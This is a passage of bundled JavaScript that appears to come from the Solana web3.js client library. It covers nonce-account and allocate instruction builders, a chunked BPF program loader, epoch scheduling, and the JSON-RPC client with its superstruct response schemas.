          }
          return new TransactionInstruction({
            keys,
            programId: this.programId,
            data
          });
        }
        static createNonceAccount(params) {
          const transaction = new Transaction();
          if ('basePubkey' in params && 'seed' in params) {
            transaction.add(SystemProgram.createAccountWithSeed({
              fromPubkey: params.fromPubkey,
              newAccountPubkey: params.noncePubkey,
              basePubkey: params.basePubkey,
              seed: params.seed,
              lamports: params.lamports,
              space: NONCE_ACCOUNT_LENGTH,
              programId: this.programId
            }));
          } else {
            transaction.add(SystemProgram.createAccount({
              fromPubkey: params.fromPubkey,
              newAccountPubkey: params.noncePubkey,
              lamports: params.lamports,
              space: NONCE_ACCOUNT_LENGTH,
              programId: this.programId
            }));
          }
          const initParams = {
            noncePubkey: params.noncePubkey,
            authorizedPubkey: params.authorizedPubkey
          };
          transaction.add(this.nonceInitialize(initParams));
          return transaction;
        }
        static nonceInitialize(params) {
          const type = SYSTEM_INSTRUCTION_LAYOUTS.InitializeNonceAccount;
          const data = encodeData(type, {
            authorized: toBuffer(params.authorizedPubkey.toBuffer())
          });
          const instructionData = {
            keys: [{
              pubkey: params.noncePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: SYSVAR_RECENT_BLOCKHASHES_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: SYSVAR_RENT_PUBKEY,
              isSigner: false,
              isWritable: false
            }],
            programId: this.programId,
            data
          };
          return new TransactionInstruction(instructionData);
        }
        static nonceAdvance(params) {
          const type = SYSTEM_INSTRUCTION_LAYOUTS.AdvanceNonceAccount;
          const data = encodeData(type);
          const instructionData = {
            keys: [{
              pubkey: params.noncePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: SYSVAR_RECENT_BLOCKHASHES_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: params.authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          };
          return new TransactionInstruction(instructionData);
        }
        static nonceWithdraw(params) {
          const type = SYSTEM_INSTRUCTION_LAYOUTS.WithdrawNonceAccount;
          const data = encodeData(type, {
            lamports: params.lamports
          });
          return new TransactionInstruction({
            keys: [{
              pubkey: params.noncePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: params.toPubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: SYSVAR_RECENT_BLOCKHASHES_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: SYSVAR_RENT_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: params.authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          });
        }
        static nonceAuthorize(params) {
          const type = SYSTEM_INSTRUCTION_LAYOUTS.AuthorizeNonceAccount;
          const data = encodeData(type, {
            authorized: toBuffer(params.newAuthorizedPubkey.toBuffer())
          });
          return new TransactionInstruction({
            keys: [{
              pubkey: params.noncePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: params.authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          });
        }
        static allocate(params) {
          let data;
          let keys;
          if ('basePubkey' in params) {
            const type = SYSTEM_INSTRUCTION_LAYOUTS.AllocateWithSeed;
            data = encodeData(type, {
              base: toBuffer(params.basePubkey.toBuffer()),
              seed: params.seed,
              space: params.space,
              programId: toBuffer(params.programId.toBuffer())
            });
            keys = [{
              pubkey: params.accountPubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: params.basePubkey,
              isSigner: true,
              isWritable: false
            }];
          } else {
            const type = SYSTEM_INSTRUCTION_LAYOUTS.Allocate;
            data = encodeData(type, {
              space: params.space
            });
            keys = [{
              pubkey: params.accountPubkey,
              isSigner: true,
              isWritable: true
            }];
          }
          return new TransactionInstruction({
            keys,
            programId: this.programId,
            data
          });
        }
      }
      SystemProgram.programId = new PublicKey('11111111111111111111111111111111');
      const CHUNK_SIZE = PACKET_DATA_SIZE - 300;
      class Loader {
        constructor() {}
        static getMinNumSignatures(dataLength) {
          return 2 * (Math.ceil(dataLength / Loader.chunkSize) + 1 + 1);
        }
        static async load(connection, payer, program, programId, data) {
          {
            const balanceNeeded = await connection.getMinimumBalanceForRentExemption(data.length);
            const programInfo = await connection.getAccountInfo(program.publicKey, 'confirmed');
            let transaction = null;
            if (programInfo !== null) {
              if (programInfo.executable) {
                console.error('Program load failed, account is already executable');
                return false;
              }
              if (programInfo.data.length !== data.length) {
                transaction = transaction || new Transaction();
                transaction.add(SystemProgram.allocate({
                  accountPubkey: program.publicKey,
                  space: data.length
                }));
              }
              if (!programInfo.owner.equals(programId)) {
                transaction = transaction || new Transaction();
                transaction.add(SystemProgram.assign({
                  accountPubkey: program.publicKey,
                  programId
                }));
              }
              if (programInfo.lamports < balanceNeeded) {
                transaction = transaction || new Transaction();
                transaction.add(SystemProgram.transfer({
                  fromPubkey: payer.publicKey,
                  toPubkey: program.publicKey,
                  lamports: balanceNeeded - programInfo.lamports
                }));
              }
            } else {
              transaction = new Transaction().add(SystemProgram.createAccount({
                fromPubkey: payer.publicKey,
                newAccountPubkey: program.publicKey,
                lamports: balanceNeeded > 0 ? balanceNeeded : 1,
                space: data.length,
                programId
              }));
            }
            if (transaction !== null) {
              await sendAndConfirmTransaction(connection, transaction, [payer, program], {
                commitment: 'confirmed'
              });
            }
          }
          const dataLayout = BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.u32('offset'), BufferLayout__namespace.u32('bytesLength'), BufferLayout__namespace.u32('bytesLengthPadding'), BufferLayout__namespace.seq(BufferLayout__namespace.u8('byte'), BufferLayout__namespace.offset(BufferLayout__namespace.u32(), -8), 'bytes')]);
          const chunkSize = Loader.chunkSize;
          let offset = 0;
          let array = data;
          let transactions = [];
          while (array.length > 0) {
            const bytes = array.slice(0, chunkSize);
            const data = buffer.Buffer.alloc(chunkSize + 16);
            dataLayout.encode({
              instruction: 0,
              offset,
              bytes: bytes,
              bytesLength: 0,
              bytesLengthPadding: 0
            }, data);
            const transaction = new Transaction().add({
              keys: [{
                pubkey: program.publicKey,
                isSigner: true,
                isWritable: true
              }],
              programId,
              data
            });
            transactions.push(sendAndConfirmTransaction(connection, transaction, [payer, program], {
              commitment: 'confirmed'
            }));
            if (connection._rpcEndpoint.includes('solana.com')) {
              const REQUESTS_PER_SECOND = 4;
              await sleep(1000 / REQUESTS_PER_SECOND);
            }
            offset += chunkSize;
            array = array.slice(chunkSize);
          }
          await Promise.all(transactions);
          {
            const dataLayout = BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')]);
            const data = buffer.Buffer.alloc(dataLayout.span);
            dataLayout.encode({
              instruction: 1
            }, data);
            const transaction = new Transaction().add({
              keys: [{
                pubkey: program.publicKey,
                isSigner: true,
                isWritable: true
              }, {
                pubkey: SYSVAR_RENT_PUBKEY,
                isSigner: false,
                isWritable: false
              }],
              programId,
              data
            });
            await sendAndConfirmTransaction(connection, transaction, [payer, program], {
              commitment: 'confirmed'
            });
          }
          return true;
        }
      }
      Loader.chunkSize = CHUNK_SIZE;
      const BPF_LOADER_PROGRAM_ID = new PublicKey('BPFLoader2111111111111111111111111111111111');
      class BpfLoader {
        static getMinNumSignatures(dataLength) {
          return Loader.getMinNumSignatures(dataLength);
        }
        static load(connection, payer, program, elf, loaderProgramId) {
          return Loader.load(connection, payer, program, loaderProgramId, elf);
        }
      }
      var objToString = Object.prototype.toString;
      var objKeys = Object.keys || function (obj) {
        var keys = [];
        for (var name in obj) {
          keys.push(name);
        }
        return keys;
      };
      function stringify(val, isArrayProp) {
        var i, max, str, keys, key, propVal, toStr;
        if (val === true) {
          return "true";
        }
        if (val === false) {
          return "false";
        }
        switch (typeof val) {
          case "object":
            if (val === null) {
              return null;
            } else if (val.toJSON && typeof val.toJSON === "function") {
              return stringify(val.toJSON(), isArrayProp);
            } else {
              toStr = objToString.call(val);
              if (toStr === "[object Array]") {
                str = '[';
                max = val.length - 1;
                for (i = 0; i < max; i++) {
                  str += stringify(val[i], true) + ',';
                }
                if (max > -1) {
                  str += stringify(val[i], true);
                }
                return str + ']';
              } else if (toStr === "[object Object]") {
                keys = objKeys(val).sort();
                max = keys.length;
                str = "";
                i = 0;
                while (i < max) {
                  key = keys[i];
                  propVal = stringify(val[key], false);
                  if (propVal !== undefined) {
                    if (str) {
                      str += ',';
                    }
                    str += JSON.stringify(key) + ':' + propVal;
                  }
                  i++;
                }
                return '{' + str + '}';
              } else {
                return JSON.stringify(val);
              }
            }
          case "function":
          case "undefined":
            return isArrayProp ? null : undefined;
          case "string":
            return JSON.stringify(val);
          default:
            return isFinite(val) ? val : null;
        }
      }
      var fastStableStringify = function (val) {
        var returnVal = stringify(val, false);
        if (returnVal !== undefined) {
          return '' + returnVal;
        }
      };
      var fastStableStringify$1 = fastStableStringify;
      const MINIMUM_SLOT_PER_EPOCH = 32;
      function trailingZeros(n) {
        let trailingZeros = 0;
        while (n > 1) {
          n /= 2;
          trailingZeros++;
        }
        return trailingZeros;
      }
      function nextPowerOfTwo(n) {
        if (n === 0) return 1;
        n--;
        n |= n >> 1;
        n |= n >> 2;
        n |= n >> 4;
        n |= n >> 8;
        n |= n >> 16;
        n |= n >> 32;
        return n + 1;
      }
      class EpochSchedule {
        constructor(slotsPerEpoch, leaderScheduleSlotOffset, warmup, firstNormalEpoch, firstNormalSlot) {
          this.slotsPerEpoch = void 0;
          this.leaderScheduleSlotOffset = void 0;
          this.warmup = void 0;
          this.firstNormalEpoch = void 0;
          this.firstNormalSlot = void 0;
          this.slotsPerEpoch = slotsPerEpoch;
          this.leaderScheduleSlotOffset = leaderScheduleSlotOffset;
          this.warmup = warmup;
          this.firstNormalEpoch = firstNormalEpoch;
          this.firstNormalSlot = firstNormalSlot;
        }
        getEpoch(slot) {
          return this.getEpochAndSlotIndex(slot)[0];
        }
        getEpochAndSlotIndex(slot) {
          if (slot < this.firstNormalSlot) {
            const epoch = trailingZeros(nextPowerOfTwo(slot + MINIMUM_SLOT_PER_EPOCH + 1)) - trailingZeros(MINIMUM_SLOT_PER_EPOCH) - 1;
            const epochLen = this.getSlotsInEpoch(epoch);
            const slotIndex = slot - (epochLen - MINIMUM_SLOT_PER_EPOCH);
            return [epoch, slotIndex];
          } else {
            const normalSlotIndex = slot - this.firstNormalSlot;
            const normalEpochIndex = Math.floor(normalSlotIndex / this.slotsPerEpoch);
            const epoch = this.firstNormalEpoch + normalEpochIndex;
            const slotIndex = normalSlotIndex % this.slotsPerEpoch;
            return [epoch, slotIndex];
          }
        }
        getFirstSlotInEpoch(epoch) {
          if (epoch <= this.firstNormalEpoch) {
            return (Math.pow(2, epoch) - 1) * MINIMUM_SLOT_PER_EPOCH;
          } else {
            return (epoch - this.firstNormalEpoch) * this.slotsPerEpoch + this.firstNormalSlot;
          }
        }
        getLastSlotInEpoch(epoch) {
          return this.getFirstSlotInEpoch(epoch) + this.getSlotsInEpoch(epoch) - 1;
        }
        getSlotsInEpoch(epoch) {
          if (epoch < this.firstNormalEpoch) {
            return Math.pow(2, epoch + trailingZeros(MINIMUM_SLOT_PER_EPOCH));
          } else {
            return this.slotsPerEpoch;
          }
        }
      }
      class SendTransactionError extends Error {
        constructor(message, logs) {
          super(message);
          this.logs = void 0;
          this.logs = logs;
        }
      }
      const SolanaJSONRPCErrorCode = {
        JSON_RPC_SERVER_ERROR_BLOCK_CLEANED_UP: -32001,
        JSON_RPC_SERVER_ERROR_SEND_TRANSACTION_PREFLIGHT_FAILURE: -32002,
        JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_VERIFICATION_FAILURE: -32003,
        JSON_RPC_SERVER_ERROR_BLOCK_NOT_AVAILABLE: -32004,
        JSON_RPC_SERVER_ERROR_NODE_UNHEALTHY: -32005,
        JSON_RPC_SERVER_ERROR_TRANSACTION_PRECOMPILE_VERIFICATION_FAILURE: -32006,
        JSON_RPC_SERVER_ERROR_SLOT_SKIPPED: -32007,
        JSON_RPC_SERVER_ERROR_NO_SNAPSHOT: -32008,
        JSON_RPC_SERVER_ERROR_LONG_TERM_STORAGE_SLOT_SKIPPED: -32009,
        JSON_RPC_SERVER_ERROR_KEY_EXCLUDED_FROM_SECONDARY_INDEX: -32010,
        JSON_RPC_SERVER_ERROR_TRANSACTION_HISTORY_NOT_AVAILABLE: -32011,
        JSON_RPC_SCAN_ERROR: -32012,
        JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_LEN_MISMATCH: -32013,
        JSON_RPC_SERVER_ERROR_BLOCK_STATUS_NOT_AVAILABLE_YET: -32014,
        JSON_RPC_SERVER_ERROR_UNSUPPORTED_TRANSACTION_VERSION: -32015,
        JSON_RPC_SERVER_ERROR_MIN_CONTEXT_SLOT_NOT_REACHED: -32016
      };
      class SolanaJSONRPCError extends Error {
        constructor({
          code,
          message,
          data
        }, customMessage) {
          super(customMessage != null ? `${customMessage}: ${message}` : message);
          this.code = void 0;
          this.data = void 0;
          this.code = code;
          this.data = data;
          this.name = 'SolanaJSONRPCError';
        }
      }
      var fetchImpl = globalThis.fetch;
      const NUM_TICKS_PER_SECOND = 160;
      const DEFAULT_TICKS_PER_SLOT = 64;
      const NUM_SLOTS_PER_SECOND = NUM_TICKS_PER_SECOND / DEFAULT_TICKS_PER_SLOT;
      const MS_PER_SLOT = 1000 / NUM_SLOTS_PER_SECOND;
      function decodeData(type, data) {
        let decoded;
        try {
          decoded = type.layout.decode(data);
        } catch (err) {
          throw new Error('invalid instruction; ' + err);
        }
        if (decoded.typeIndex !== type.index) {
          throw new Error(`invalid account data; account type mismatch ${decoded.typeIndex} != ${type.index}`);
        }
        return decoded;
      }
      const LOOKUP_TABLE_META_SIZE = 56;
      class AddressLookupTableAccount {
        constructor(args) {
          this.key = void 0;
          this.state = void 0;
          this.key = args.key;
          this.state = args.state;
        }
        isActive() {
          const U64_MAX = BigInt('0xffffffffffffffff');
          return this.state.deactivationSlot === U64_MAX;
        }
        static deserialize(accountData) {
          const meta = decodeData(LookupTableMetaLayout, accountData);
          const serializedAddressesLen = accountData.length - LOOKUP_TABLE_META_SIZE;
          assert(serializedAddressesLen >= 0, 'lookup table is invalid');
          assert(serializedAddressesLen % 32 === 0, 'lookup table is invalid');
          const numSerializedAddresses = serializedAddressesLen / 32;
          const {
            addresses
          } = BufferLayout__namespace.struct([BufferLayout__namespace.seq(publicKey(), numSerializedAddresses, 'addresses')]).decode(accountData.slice(LOOKUP_TABLE_META_SIZE));
          return {
            deactivationSlot: meta.deactivationSlot,
            lastExtendedSlot: meta.lastExtendedSlot,
            lastExtendedSlotStartIndex: meta.lastExtendedStartIndex,
            authority: meta.authority.length !== 0 ? new PublicKey(meta.authority[0]) : undefined,
            addresses: addresses.map(address => new PublicKey(address))
          };
        }
      }
      const LookupTableMetaLayout = {
        index: 1,
        layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('typeIndex'), u64('deactivationSlot'), BufferLayout__namespace.nu64('lastExtendedSlot'), BufferLayout__namespace.u8('lastExtendedStartIndex'), BufferLayout__namespace.u8(), BufferLayout__namespace.seq(publicKey(), BufferLayout__namespace.offset(BufferLayout__namespace.u8(), -1), 'authority')])
      };
      const URL_RE = /^[^:]+:\/\/([^:[]+|\[[^\]]+\])(:\d+)?(.*)/i;
      function makeWebsocketUrl(endpoint) {
        const matches = endpoint.match(URL_RE);
        if (matches == null) {
          throw TypeError(`Failed to validate endpoint URL \`${endpoint}\``);
        }
        const [_, hostish, portWithColon, rest] = matches;
        const protocol = endpoint.startsWith('https:') ? 'wss:' : 'ws:';
        const startPort = portWithColon == null ? null : parseInt(portWithColon.slice(1), 10);
        const websocketPort = startPort == null ? '' : `:${startPort + 1}`;
        return `${protocol}//${hostish}${websocketPort}${rest}`;
      }
      var _process$env$npm_pack;
      const PublicKeyFromString = superstruct.coerce(superstruct.instance(PublicKey), superstruct.string(), value => new PublicKey(value));
      const RawAccountDataResult = superstruct.tuple([superstruct.string(), superstruct.literal('base64')]);
      const BufferFromRawAccountData = superstruct.coerce(superstruct.instance(buffer.Buffer), RawAccountDataResult, value => buffer.Buffer.from(value[0], 'base64'));
      const BLOCKHASH_CACHE_TIMEOUT_MS = 30 * 1000;
      function assertEndpointUrl(putativeUrl) {
        if (/^https?:/.test(putativeUrl) === false) {
          throw new TypeError('Endpoint URL must start with `http:` or `https:`.');
        }
        return putativeUrl;
      }
      function extractCommitmentFromConfig(commitmentOrConfig) {
        let commitment;
        let config;
        if (typeof commitmentOrConfig === 'string') {
          commitment = commitmentOrConfig;
        } else if (commitmentOrConfig) {
          const {
            commitment: specifiedCommitment,
            ...specifiedConfig
          } = commitmentOrConfig;
          commitment = specifiedCommitment;
          config = specifiedConfig;
        }
        return {
          commitment,
          config
        };
      }
      function createRpcResult(result) {
        return superstruct.union([superstruct.type({
          jsonrpc: superstruct.literal('2.0'),
          id: superstruct.string(),
          result
        }), superstruct.type({
          jsonrpc: superstruct.literal('2.0'),
          id: superstruct.string(),
          error: superstruct.type({
            code: superstruct.unknown(),
            message: superstruct.string(),
            data: superstruct.optional(superstruct.any())
          })
        })]);
      }
      const UnknownRpcResult = createRpcResult(superstruct.unknown());
      function jsonRpcResult(schema) {
        return superstruct.coerce(createRpcResult(schema), UnknownRpcResult, value => {
          if ('error' in value) {
            return value;
          } else {
            return {
              ...value,
              result: superstruct.create(value.result, schema)
            };
          }
        });
      }
      function jsonRpcResultAndContext(value) {
        return jsonRpcResult(superstruct.type({
          context: superstruct.type({
            slot: superstruct.number()
          }),
          value
        }));
      }
      function notificationResultAndContext(value) {
        return superstruct.type({
          context: superstruct.type({
            slot: superstruct.number()
          }),
          value
        });
      }
      function versionedMessageFromResponse(version, response) {
        if (version === 0) {
          return new MessageV0({
            header: response.header,
            staticAccountKeys: response.accountKeys.map(accountKey => new PublicKey(accountKey)),
            recentBlockhash: response.recentBlockhash,
            compiledInstructions: response.instructions.map(ix => ({
              programIdIndex: ix.programIdIndex,
              accountKeyIndexes: ix.accounts,
              data: bs58__default["default"].decode(ix.data)
            })),
            addressTableLookups: response.addressTableLookups
          });
        } else {
          return new Message(response);
        }
      }
      const GetInflationGovernorResult = superstruct.type({
        foundation: superstruct.number(),
        foundationTerm: superstruct.number(),
        initial: superstruct.number(),
        taper: superstruct.number(),
        terminal: superstruct.number()
      });
      const GetInflationRewardResult = jsonRpcResult(superstruct.array(superstruct.nullable(superstruct.type({
        epoch: superstruct.number(),
        effectiveSlot: superstruct.number(),
        amount: superstruct.number(),
        postBalance: superstruct.number()
      }))));
      const GetEpochInfoResult = superstruct.type({
        epoch: superstruct.number(),
        slotIndex: superstruct.number(),
        slotsInEpoch: superstruct.number(),
        absoluteSlot: superstruct.number(),
        blockHeight: superstruct.optional(superstruct.number()),
        transactionCount: superstruct.optional(superstruct.number())
      });
      const GetEpochScheduleResult = superstruct.type({
        slotsPerEpoch: superstruct.number(),
        leaderScheduleSlotOffset: superstruct.number(),
        warmup: superstruct.boolean(),
        firstNormalEpoch: superstruct.number(),
        firstNormalSlot: superstruct.number()
      });
      const GetLeaderScheduleResult = superstruct.record(superstruct.string(), superstruct.array(superstruct.number()));
      const TransactionErrorResult = superstruct.nullable(superstruct.union([superstruct.type({}), superstruct.string()]));
      const SignatureStatusResult = superstruct.type({
        err: TransactionErrorResult
      });
      const SignatureReceivedResult = superstruct.literal('receivedSignature');
      const VersionResult = superstruct.type({
        'solana-core': superstruct.string(),
        'feature-set': superstruct.optional(superstruct.number())
      });
      const SimulatedTransactionResponseStruct = jsonRpcResultAndContext(superstruct.type({
        err: superstruct.nullable(superstruct.union([superstruct.type({}), superstruct.string()])),
        logs: superstruct.nullable(superstruct.array(superstruct.string())),
        accounts: superstruct.optional(superstruct.nullable(superstruct.array(superstruct.nullable(superstruct.type({
          executable: superstruct.boolean(),
          owner: superstruct.string(),
          lamports: superstruct.number(),
          data: superstruct.array(superstruct.string()),
          rentEpoch: superstruct.optional(superstruct.number())
        }))))),
        unitsConsumed: superstruct.optional(superstruct.number()),
        returnData: superstruct.optional(superstruct.nullable(superstruct.type({
          programId: superstruct.string(),
          data: superstruct.tuple([superstruct.string(), superstruct.literal('base64')])
        })))
      }));
      const BlockProductionResponseStruct = jsonRpcResultAndContext(superstruct.type({
        byIdentity: superstruct.record(superstruct.string(), superstruct.array(superstruct.number())),
        range: superstruct.type({
          firstSlot: superstruct.number(),
          lastSlot: superstruct.number()
        })
      }));
      function createRpcClient(url, httpHeaders, customFetch, fetchMiddleware, disableRetryOnRateLimit) {
        const fetch = customFetch ? customFetch : fetchImpl;
        let fetchWithMiddleware;
        if (fetchMiddleware) {
          fetchWithMiddleware = async (info, init) => {
            const modifiedFetchArgs = await new Promise((resolve, reject) => {
              try {
                fetchMiddleware(info, init, (modifiedInfo, modifiedInit) => resolve([modifiedInfo, modifiedInit]));
              } catch (error) {
                reject(error);
              }
            });
            return await fetch(...modifiedFetchArgs);
          };
        }
        const clientBrowser = new RpcClient__default["default"](async (request, callback) => {
          const agent = undefined;
          const options = {
            method: 'POST',
            body: request,
            agent,
            headers: Object.assign({
              'Content-Type': 'application/json'
            }, httpHeaders || {}, COMMON_HTTP_HEADERS)
          };
          try {
            let too_many_requests_retries = 5;
            let res;
            let waitTime = 500;
            for (;;) {
              if (fetchWithMiddleware) {
                res = await fetchWithMiddleware(url, options);
              } else {
                res = await fetch(url, options);
              }
              if (res.status !== 429) {
                break;
              }
              if (disableRetryOnRateLimit === true) {
                break;
              }
              too_many_requests_retries -= 1;
              if (too_many_requests_retries === 0) {
                break;
              }
              console.log(`Server responded with ${res.status} ${res.statusText}.  Retrying after ${waitTime}ms delay...`);
              await sleep(waitTime);
              waitTime *= 2;
            }
            const text = await res.text();
            if (res.ok) {
              callback(null, text);
            } else {
              callback(new Error(`${res.status} ${res.statusText}: ${text}`));
            }
          } catch (err) {
            if (err instanceof Error) callback(err);
          } finally {}
        }, {});
        return clientBrowser;
      }
      function createRpcRequest(client) {
        return (method, args) => {
          return new Promise((resolve, reject) => {
            client.request(method, args, (err, response) => {
              if (err) {
                reject(err);
                return;
              }
              resolve(response);
            });
          });
        };
      }
      function createRpcBatchRequest(client) {
        return requests => {
          return new Promise((resolve, reject) => {
            if (requests.length === 0) resolve([]);
            const batch = requests.map(params => {
              return client.request(params.methodName, params.args);
            });
            client.request(batch, (err, response) => {
              if (err) {
                reject(err);
                return;
              }
              resolve(response);
            });
          });
        };
      }
      const GetInflationGovernorRpcResult = jsonRpcResult(GetInflationGovernorResult);
      const GetEpochInfoRpcResult = jsonRpcResult(GetEpochInfoResult);
      const GetEpochScheduleRpcResult = jsonRpcResult(GetEpochScheduleResult);
      const GetLeaderScheduleRpcResult = jsonRpcResult(GetLeaderScheduleResult);
      const SlotRpcResult = jsonRpcResult(superstruct.number());
      const GetSupplyRpcResult = jsonRpcResultAndContext(superstruct.type({
        total: superstruct.number(),
        circulating: superstruct.number(),
        nonCirculating: superstruct.number(),
        nonCirculatingAccounts: superstruct.array(PublicKeyFromString)
      }));
      const TokenAmountResult = superstruct.type({
        amount: superstruct.string(),
        uiAmount: superstruct.nullable(superstruct.number()),
        decimals: superstruct.number(),
        uiAmountString: superstruct.optional(superstruct.string())
      });
      const GetTokenLargestAccountsResult = jsonRpcResultAndContext(superstruct.array(superstruct.type({
        address: PublicKeyFromString,
        amount: superstruct.string(),
        uiAmount: superstruct.nullable(superstruct.number()),
        decimals: superstruct.number(),
        uiAmountString: superstruct.optional(superstruct.string())
      })));
      const GetTokenAccountsByOwner = jsonRpcResultAndContext(superstruct.array(superstruct.type({
        pubkey: PublicKeyFromString,
        account: superstruct.type({
          executable: superstruct.boolean(),
          owner: PublicKeyFromString,
          lamports: superstruct.number(),
          data: BufferFromRawAccountData,
          rentEpoch: superstruct.number()
        })
      })));
      const ParsedAccountDataResult = superstruct.type({
        program: superstruct.string(),
        parsed: superstruct.unknown(),
        space: superstruct.number()
      });
      const GetParsedTokenAccountsByOwner = jsonRpcResultAndContext(superstruct.array(superstruct.type({
        pubkey: PublicKeyFromString,
        account: superstruct.type({
          executable: superstruct.boolean(),
          owner: PublicKeyFromString,
          lamports: superstruct.number(),
          data: ParsedAccountDataResult,
          rentEpoch: superstruct.number()
        })
      })));
      const GetLargestAccountsRpcResult = jsonRpcResultAndContext(superstruct.array(superstruct.type({
        lamports: superstruct.number(),
        address: PublicKeyFromString
      })));
      const AccountInfoResult = superstruct.type({
        executable: superstruct.boolean(),
        owner: PublicKeyFromString,
        lamports: superstruct.number(),
        data: BufferFromRawAccountData,
        rentEpoch: superstruct.number()
      });
      const KeyedAccountInfoResult = superstruct.type({
        pubkey: PublicKeyFromString,
        account: AccountInfoResult
      });
      const ParsedOrRawAccountData = superstruct.coerce(superstruct.union([superstruct.instance(buffer.Buffer), ParsedAccountDataResult]), superstruct.union([RawAccountDataResult, ParsedAccountDataResult]), value => {
        if (Array.isArray(value)) {
          return superstruct.create(value, BufferFromRawAccountData);
        } else {
          return value;
        }
      });
      const ParsedAccountInfoResult = superstruct.type({
        executable: superstruct.boolean(),
        owner: PublicKeyFromString,
        lamports: superstruct.number(),
        data: ParsedOrRawAccountData,
        rentEpoch: superstruct.number()
      });
      const KeyedParsedAccountInfoResult = superstruct.type({
        pubkey: PublicKeyFromString,
        account: ParsedAccountInfoResult
      });
      const StakeActivationResult = superstruct.type({
        state: superstruct.union([superstruct.literal('active'), superstruct.literal('inactive'), superstruct.literal('activating'), superstruct.literal('deactivating')]),
        active: superstruct.number(),
        inactive: superstruct.number()
      });
      const GetConfirmedSignaturesForAddress2RpcResult = jsonRpcResult(superstruct.array(superstruct.type({
        signature: superstruct.string(),
        slot: superstruct.number(),
        err: TransactionErrorResult,
        memo: superstruct.nullable(superstruct.string()),
        blockTime: superstruct.optional(superstruct.nullable(superstruct.number()))
      })));
      const GetSignaturesForAddressRpcResult = jsonRpcResult(superstruct.array(superstruct.type({
        signature: superstruct.string(),
        slot: superstruct.number(),
        err: TransactionErrorResult,
        memo: superstruct.nullable(superstruct.string()),
        blockTime: superstruct.optional(superstruct.nullable(superstruct.number()))
      })));
      const AccountNotificationResult = superstruct.type({
        subscription: superstruct.number(),
        result: notificationResultAndContext(AccountInfoResult)
      });
      const ProgramAccountInfoResult = superstruct.type({
        pubkey: PublicKeyFromString,
        account: AccountInfoResult
      });
      const ProgramAccountNotificationResult = superstruct.type({
        subscription: superstruct.number(),
        result: notificationResultAndContext(ProgramAccountInfoResult)
      });
      const SlotInfoResult = superstruct.type({
        parent: superstruct.number(),
        slot: superstruct.number(),
        root: superstruct.number()
      });
      const SlotNotificationResult = superstruct.type({
        subscription: superstruct.number(),
        result: SlotInfoResult
      });
      const SlotUpdateResult = superstruct.union([superstruct.type({
        type: superstruct.union([superstruct.literal('firstShredReceived'), superstruct.literal('completed'), superstruct.literal('optimisticConfirmation'), superstruct.literal('root')]),
        slot: superstruct.number(),
        timestamp: superstruct.number()
      }), superstruct.type({
        type: superstruct.literal('createdBank'),
        parent: superstruct.number(),
        slot: superstruct.number(),
        timestamp: superstruct.number()
      }), superstruct.type({
        type: superstruct.literal('frozen'),
        slot: superstruct.number(),
        timestamp: superstruct.number(),
        stats: superstruct.type({
          numTransactionEntries: superstruct.number(),
          numSuccessfulTransactions: superstruct.number(),
          numFailedTransactions: superstruct.number(),
          maxTransactionsPerEntry: superstruct.number()
        })
      }), superstruct.type({
        type: superstruct.literal('dead'),
        slot: superstruct.number(),
        timestamp: superstruct.number(),
        err: superstruct.string()
      })]);
      const SlotUpdateNotificationResult = superstruct.type({
        subscription: superstruct.number(),
        result: SlotUpdateResult
      });
      const SignatureNotificationResult = superstruct.type({
        subscription: superstruct.number(),
        result: notificationResultAndContext(superstruct.union([SignatureStatusResult, SignatureReceivedResult]))
      });
      const RootNotificationResult = superstruct.type({
        subscription: superstruct.number(),
        result: superstruct.number()
      });
      const ContactInfoResult = superstruct.type({
        pubkey: superstruct.string(),
        gossip: superstruct.nullable(superstruct.string()),
        tpu: superstruct.nullable(superstruct.string()),
        rpc: superstruct.nullable(superstruct.string()),
        version: superstruct.nullable(superstruct.string())
      });
      const VoteAccountInfoResult = superstruct.type({
        votePubkey: superstruct.string(),
        nodePubkey: superstruct.string(),
        activatedStake: superstruct.number(),
        epochVoteAccount: superstruct.boolean(),
        epochCredits: superstruct.array(superstruct.tuple([superstruct.number(), superstruct.number(), superstruct.number()])),
        commission: superstruct.number(),
        lastVote: superstruct.number(),
        rootSlot: superstruct.nullable(superstruct.number())
      });
      const GetVoteAccounts = jsonRpcResult(superstruct.type({
        current: superstruct.array(VoteAccountInfoResult),
        delinquent: superstruct.array(VoteAccountInfoResult)
      }));
      const ConfirmationStatus = superstruct.union([superstruct.literal('processed'), superstruct.literal('confirmed'), superstruct.literal('finalized')]);
      const SignatureStatusResponse = superstruct.type({
        slot: superstruct.number(),
        confirmations: superstruct.nullable(superstruct.number()),
        err: TransactionErrorResult,
        confirmationStatus: superstruct.optional(ConfirmationStatus)
      });
      const GetSignatureStatusesRpcResult = jsonRpcResultAndContext(superstruct.array(superstruct.nullable(SignatureStatusResponse)));
      const GetMinimumBalanceForRentExemptionRpcResult = jsonRpcResult(superstruct.number());
      const AddressTableLookupStruct = superstruct.type({
        accountKey: PublicKeyFromString,
        writableIndexes: superstruct.array(superstruct.number()),
        readonlyIndexes: superstruct.array(superstruct.number())
      });
      const ConfirmedTransactionResult = superstruct.type({
        signatures: superstruct.array(superstruct.string()),
        message: superstruct.type({
          accountKeys: superstruct.array(superstruct.string()),
          header: superstruct.type({
            numRequiredSignatures: superstruct.number(),
            numReadonlySignedAccounts: superstruct.number(),
            numReadonlyUnsignedAccounts: superstruct.number()
          }),
          instructions: superstruct.array(superstruct.type({
